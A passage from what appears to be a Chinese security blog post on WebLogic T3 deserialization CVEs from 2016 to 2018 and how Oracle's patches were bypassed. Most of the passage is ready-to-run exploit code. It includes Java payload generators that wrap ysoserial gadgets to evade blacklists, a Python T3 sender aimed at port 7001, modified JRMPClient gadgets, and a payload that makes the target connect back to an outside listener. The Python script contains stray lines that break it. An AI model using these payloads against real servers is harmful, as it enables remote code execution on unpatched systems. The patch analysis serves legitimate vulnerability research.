class="keyword">new</span> StreamMessageImpl(payload);</span><br><span class="line">        ser(streamMessage, <span class="string">"CVE_2016_0638.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] exec(String gadget, String command) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"</span>, gadget, command&#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------序列化成功"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>乱入一个QA<br>Q：StreamMessageImpl可以过黑名单很好理解，但是为啥CommonsCollections1依旧可以成功，CommonsCollections1(org.apache.commons.collections.functors)不是在黑名单里面吗？</p><p>A：答案是ServerChannelInputStream没有过滤到org.apache.commons.collections.functors（废话）。细节是这样的：ServerChannelInputStream的resolveClass检验到是StreamMessageImpl，不在黑名单里面，通过。然后在反序列化流程中会调用StreamMessageImpl的readExternal，readExternal内部又new了新的ObjectInputStream（以后简称ois）并从缓冲区读反序列化数据再次调用readObject，这里原生的ois就是原生的resolveClass方法没有过滤。</p><h2 id="CVE-2016-0638的修复"><a href="#CVE-2016-0638的修复" class="headerlink" title="CVE-2016-0638的修复"></a>CVE-2016-0638的修复</h2><p>补丁：2016年4月p22505423_1036_Generic<br>把原生的ois换成了FilteringObjectInputStream<br><img src="1584696710445-285d9310-d737-4813-9851-acb1ec0cb88c.png" alt="image.png"></p><p><img src="1585128049921-46a472c4-7c3e-4e27-b89b-8158dc26c689.png" alt="image.png"></p><h2 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h2><p>weblogic.corba.utils.MarshalledObject不在黑名单中，并且在readResolve的时候会读取objBytes的值赋给新new的ois。那么我们在objBytes中放入rce payload即可。<br><img src="1584673888248-d2782a8f-2687-4522-979d-648f5e9ebf9a.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weblogic.corba.utils.MarshalledObject;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2016_3510</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] payload = exec(<span class="string">"CommonsCollections1"</span>, <span class="string">"touch /tmp/CVE_2016_3510"</span>);</span><br><span class="line">        MarshalledObject marshalledObject = <span class="keyword">new</span> MarshalledObject(<span class="string">"foo"</span>);</span><br><span class="line">        Class cls = marshalledObject.getClass();</span><br><span class="line">        Field field = cls.getDeclaredField(<span class="string">"objBytes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(marshalledObject, payload);</span><br><span class="line">        ser(marshalledObject,<span class="string">"./CVE_2016_3510.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] exec(String gadget, String command) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">"java"</span>, <span class="string">"-jar"</span>, <span class="string">"/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"</span>, gadget, command&#125;;</span><br><span class="line">        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------序列化成功"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2016-3510的修复"><a href="#CVE-2016-3510的修复" class="headerlink" title="CVE-2016-3510的修复"></a>CVE-2016-3510的修复</h2><p>补丁：2016年10月 p23743997_1036_Generic<br>重写了resolveClass方法，加了过滤。<br><img src="1584690943146-86f42e61-9803-4867-901f-18ceed907805.png" alt="image.png"></p><p><img src="1585129024461-13bed8a0-4c46-4d97-a8f4-6b89d07c44bb.png" alt="image.png"></p><h2 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h2><p>利用JRMPClient进行带外rce，这个技巧相信看过<a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html">橘子师傅shiro rce</a>的操作的师很熟悉了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload1</span><span class="params">(gadget, command)</span>:</span></span><br><span class="line">    JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload2</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port, payload)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.compile(<span class="string">r"HELO:(.*).false"</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> len(version) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Not Weblogic"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Weblogic &#123;&#125;"</span>.format(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b"00000000"</span>) <span class="comment">#数据包长度，先占位，后面会根据实际情况重新</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>) <span class="comment">#t3协议头</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b"fe010000"</span>) <span class="comment">#反序列化数据标志</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:] <span class="comment">#重新计算数据包长度</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    host = <span class="string">"127.0.0.1"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">"JRMPClient"</span>  <span class="comment">#CommonsCollections1 Jdk7u21 JRMPClient</span></span><br><span class="line">    command = <span class="string">"192.168.1.3:8080"</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    )</span><br><span class="line">    )</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure><h2 id="CVE-2017-3248的修复"><a href="#CVE-2017-3248的修复" class="headerlink" title="CVE-2017-3248的修复"></a>CVE-2017-3248的修复</h2><p>补丁：p24667634_1036_Generic<br>官方的修复是新加resolveProxyClass，过滤java.rmi.registry.Registry<br><img src="1584934771356-0b9b6e3c-7b83-48d7-8d1d-da75cbcf714f.png" alt="image.png"></p><h2 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h2><p>上面提到过滤了Registry，这样ysoserial中原生JRMPClient就打不了，但是仍然有多种办法bypass。</p><h3 id="替换接口"><a href="#替换接口" class="headerlink" title="替换接口"></a>替换接口</h3><p>引用@<a href="https://xz.aliyun.com/u/4522"><strong>lpwd</strong></a>师傅的话：</p><blockquote><p>这个CVE廖也提交了绕过，他的绕过是用java.rmi.activation.Activator替换java.rmi.registry.Registry，从而绕过resolveProxyClass的判断。其实这里对接口没有要求，不一定是rmi接口，随便找一个接口都行，比如java.util.Map</p></blockquote><p><img src="1584684491514-7974dab3-f688-4bf2-8e8d-e5d49f9a6bd5.png" alt="image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">"restriction"</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest</span>( harness=<span class="string">"ysoserial.test.payloads.JRMPReverseConnectSMTest"</span>)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient3</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Map</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">        Map proxy = (Map) Proxy.newProxyInstance(</span><br><span class="line">            JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>(),</span></span><br><span class="line">            new Class[] &#123; Map.class &#125;,</span><br><span class="line">            obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line">        PayloadRunner.run(JRMPClient<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="直接用UnicastRef"><a href="#直接用UnicastRef" class="headerlink" title="直接用UnicastRef"></a>直接用UnicastRef</h3><p>CVE-2017-3248的构造中把UnicastRef放入了Registry，其实用UnicastRef也能在反序列化的时候发起jrmp请求。这种方法要比替换接口的干脆很多。在ysoserial中加一个JRMPClient2</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">"restriction"</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest</span>( harness=<span class="string">"ysoserial.test.payloads.JRMPReverseConnectSMTest"</span>)</span><br><span class="line"><span class="meta">@Authors</span>(&#123; Authors.MBECHLER &#125;)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JRMPClient2</span> <span class="keyword">extends</span> <span class="title">PayloadRunner</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">UnicastRef</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UnicastRef <span class="title">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String host;</span><br><span class="line">        <span class="keyword">int</span> port;</span><br><span class="line">        <span class="keyword">int</span> sep = command.indexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> Random().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        ObjID id = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">        UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient<span class="class">.<span class="keyword">class</span>.<span class="title">getClassLoader</span>())</span>;</span><br><span class="line">        PayloadRunner.run(JRMPClient<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-2628的修复"><a href="#CVE-2018-2628的修复" class="headerlink" title="CVE-2018-2628的修复"></a>CVE-2018-2628的修复</h2><p>补丁：2018年四月发布的p27395085_1036_Generic<br>UnicastRef在weblogic.utils.io.oif.WebLogicFilterConfig中加进了黑名单。<br><img src="1584698130591-207644b4-ca01-41d7-aaa6-a38737075255.png" alt="image.png"></p><h2 id="CVE-2018-2893"><a href="#CVE-2018-2893" class="headerlink" title="CVE-2018-2893"></a>CVE-2018-2893</h2><p>streamMessageImpl + jrmp代理类绕过。先来看payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.jms.common.StreamMessageImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_2893</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjID objID = <span class="keyword">new</span> ObjID(<span class="keyword">new</span> Random().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        TCPEndpoint tcpEndpoint = <span class="keyword">new</span> TCPEndpoint(<span class="string">"192.168.1.3"</span>, <span class="number">8080</span>);</span><br><span class="line">        UnicastRef unicastRef = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(objID, tcpEndpoint, <span class="keyword">false</span>));</span><br><span class="line">        RemoteObjectInvocationHandler remoteObjectInvocationHandler = <span class="keyword">new</span> RemoteObjectInvocationHandler(unicastRef);</span><br><span class="line">        Object object = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), <span class="keyword">new</span> Class[] &#123; Registry<span class="class">.<span class="keyword">class</span> &#125;, <span class="title">remoteObjectInvocationHandler</span>)</span>;</span><br><span class="line">        StreamMessageImpl streamMessage = <span class="keyword">new</span> StreamMessageImpl(serialize(object));</span><br><span class="line">        ser(streamMessage, <span class="string">"CVE_2018_2893.ser"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">ser</span><span class="params">(Object obj, String serName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        File file = <span class="keyword">new</span> File(serName);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        System.out.println(<span class="string">"-------序列化成功"</span> + serName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">final</span> ByteArrayOutputStream out = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        serialize(obj, out);</span><br><span class="line">        <span class="keyword">return</span> out.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(out);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>什么鬼？payload中用到的streamMessageImpl、Registry、UnicastRef不是已经被修复了吗？</p><p>我们来细看一下怎么修的。<br>streamMessageImpl的readExternal内部是拿给FilteringObjectInputStream过滤。<br><img src="1584710908628-4d0c2a6d-e1b7-4228-a3cb-9d524c3ab646.png" alt="image.png"></p><p>FilteringObjectInputStream只是对普通类的反序列化进行了拦截，<strong>并没有对代理类进行拦截</strong>。对你没看错，虽然在CVE-2017-3248后ServerChannelInoutStream类中的resolveProxyClass过滤了Registry，但是这里的FilteringObjectInputStream并没有实现resolveProxyClass过滤代理类。<br><img src="1584710976177-97024508-c398-4f6e-b4eb-21a5de7eea5b.png" 